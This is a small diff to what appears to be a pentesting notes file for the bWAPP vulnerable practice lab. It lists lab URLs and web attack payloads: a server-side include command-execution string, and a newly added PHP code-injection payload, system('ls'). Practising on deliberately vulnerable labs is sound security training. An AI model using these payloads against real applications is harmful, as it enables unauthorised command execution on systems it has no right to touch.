@@ -37,6 +37,7 @@ Payload : <!--#exec cmd="OS_COMMAND" -->
 
 # Code Injection
 Lab : https://bwapp.hakhub.net/phpi.php
+Payload : system("ls")
 
 # Local File Inclusion/ Remote File Inclusion
 Lab: https://bwapp.hakhub.net/rlfi.php
